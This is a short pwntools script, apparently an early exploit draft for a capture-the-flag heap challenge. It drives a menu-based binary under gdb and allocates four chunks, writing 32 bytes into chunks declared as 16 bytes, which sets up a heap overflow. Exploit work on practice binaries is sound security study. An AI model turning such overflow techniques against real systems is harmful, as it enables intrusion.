from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#elf = ELF("./chall")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


#p = process("./chall")
#p = remote("1.2.3.4", 30246)
p = gdb.debug("./chall", '''
b *main
''')

padA = b"A" * 32
padB = b"B" * 32
padC = b"C" * 32

# Menu
p.recvline()
p.sendline(b"4")

# Menu
p.recvline()
p.sendline(b"1")

# Index
p.recvline()
p.sendline(b"1")

# Size
p.recvline()
p.sendline(b"16")

# Content
p.recvline()
p.sendline(b'A' * 32)

# Menu
p.recvline()
p.sendline(b"1")

# Index
p.recvline()
p.sendline(b"2")

p.recvline()
p.sendline(b"16")

p.recvline()
p.sendline(b'B' * 32)

# Menu
p.recvline()
p.sendline(b"1")

# Index
p.recvline()
p.sendline(b"3")

p.recvline()
p.sendline(b"32")

p.recvline()
p.sendline(b'C' * 32)


# Menu
p.recvline()
p.sendline(b"1")

# Index
p.recvline()
p.sendline(b"4")

p.recvline()
p.sendline(b"32")

p.recvline()
p.sendline(b'D' * 32)


p.recvline()
p.interactive()

